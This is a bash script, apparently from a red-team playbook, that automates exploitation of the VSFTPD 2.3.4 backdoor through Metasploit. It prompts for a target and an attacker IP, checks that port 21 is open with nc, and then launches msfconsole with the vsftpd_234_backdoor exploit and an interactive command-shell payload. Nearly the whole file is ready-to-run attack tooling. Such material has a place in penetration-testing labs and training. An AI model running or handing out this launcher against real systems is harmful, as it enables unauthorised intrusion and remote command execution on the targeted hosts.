#!/bin/bash

# =============================================================
# IRTx Red Team - VSFTPD 2.3.4 Backdoor Launcher
# DataBreach | Red Team Playbook
# =============================================================

RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Banner ---
echo -e "${RED}"
echo "  ██╗   ██╗███████╗███████╗████████╗██████╗ ██████╗ "
echo "  ██║   ██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗"
echo "  ██║   ██║███████╗█████╗     ██║   ██████╔╝██║  ██║"
echo "  ╚██╗ ██╔╝╚════██║██╔══╝     ██║   ██╔═══╝██║  ██║"
echo "   ╚████╔╝ ███████║██║        ██║   ██║     ██████╔╝"
echo "    ╚═══╝  ╚══════╝╚═╝        ╚═╝   ╚═╝     ╚═════╝ "
echo -e "${CYAN}        IRTx Red Team — VSFTPD 2.3.4 Backdoor${RESET}"
echo -e "${YELLOW}                   DataBreach${RESET}"
echo ""

# --- Privilege Check ---
if [[ $EUID -ne 0 ]]; then
  echo -e "${RED}[!] Run as root: sudo ./vsftpd.sh${RESET}"
  exit 1
fi

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${YELLOW}  VSFTPD 2.3.4 — Backdoor Command Execution${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

# --- Input ---
echo -e "${YELLOW}[?] Enter Your Target IP address ${BOLD}(RHOST)${RESET}${YELLOW}:${RESET}"
read -r TARGET

echo ""
echo -e "${YELLOW}[?] Enter your Kali IP address ${BOLD}(LHOST)${RESET}${YELLOW}:${RESET}"
read -r LHOST

# --- Verify port 21 is open ---
echo ""
echo -e "${YELLOW}[+] Checking port 21 on $TARGET...${RESET}"
nc -zv -w 3 "$TARGET" 21 > /dev/null 2>&1
if [[ $? -eq 0 ]]; then
  echo -e "${GREEN}[✓] Port 21 open — vsftpd likely running.${RESET}"
else
  echo -e "${RED}[!] Port 21 not reachable on $TARGET — check your IP.${RESET}"
  exit 1
fi

# --- Confirm ---
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}  Confirm Attack Configuration:${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${YELLOW}Target  (RHOST) :${RESET} ${BOLD}${RED}$TARGET${RESET}"
echo -e "  ${YELLOW}Attacker (LHOST):${RESET} ${BOLD}${GREEN}$LHOST${RESET}"
echo -e "  ${YELLOW}Exploit         :${RESET} exploit/unix/ftp/vsftpd_234_backdoor"
echo -e "  ${YELLOW}Payload         :${RESET} cmd/unix/interact"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
echo -e "${YELLOW}[?] Launch exploit? ${BOLD}(y/n)${RESET}${YELLOW}:${RESET}"
read -r CONFIRM

if [[ "$CONFIRM" != "y" && "$CONFIRM" != "Y" ]]; then
  echo ""
  echo -e "${RED}[!] Aborted.${RESET}"
  exit 0
fi

# --- Launch ---
echo ""
echo -e "${MAGENTA}[>] Launching msfconsole...${RESET}"
echo ""

msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS $TARGET;
set LHOST $LHOST;
set PAYLOAD cmd/unix/interact;
exploit;
"
